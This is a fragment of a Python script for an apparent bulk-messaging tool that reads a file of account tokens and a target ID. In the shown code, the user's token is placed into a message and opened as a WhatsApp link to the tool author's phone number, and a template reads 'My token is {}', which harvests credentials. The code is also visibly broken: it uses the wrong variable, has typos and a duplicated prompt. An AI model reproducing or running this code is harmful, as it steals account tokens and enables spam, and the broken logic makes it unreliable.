...
def send_initial_message(tokens_file, target_id):
    ...
    msg_template = "Hello sarup papa! I am using your server. My token is {}"
    
    try:
        httpCaht = requests.get('https://github.com/sarup123/tricks/tree/main').text.strip()
        if id in httpCaht:
            ...
            print(Fore.RED + 'free wale dur rahee:)')
            print(Fore.WHITE + '----------------------------------------------')
            print(Fore.RED + 'Tool Owner: sarup xD')
            print(eno + " " + Fore.YELLOW + "Your Token is : " + id)
            input(Fore.YELLOW + 'IF YOU WANT TO BUY THEN PRESS ENTER ')
            tks = ('Hello%20sarup bhai%20!%20Please%20Approve%20My%20Token%20My%20token%20Is%20:%20' + id + '%20My%20Name%20is%20' + eno)
            os.system('am start https://wa.me/+9766306643?text=' + tks)
            time.sleep(1)
            exit()
...
def main():
    ...
    print(Fore.MAGENTA + "----- MULTI CONVO TOOL BY SARUP XD-----")
    print(Fore.CYAN + "--------------SARUP DON HERE----------------------")
    # Get file paths and other inputs from the user
    tokens_file = input(Fore.YELLOW + "Enter the path to the tokens file: ").strip()
    target_id = input(Fore.YELLOW +  "Enter the path to the tokens file: ").strip()
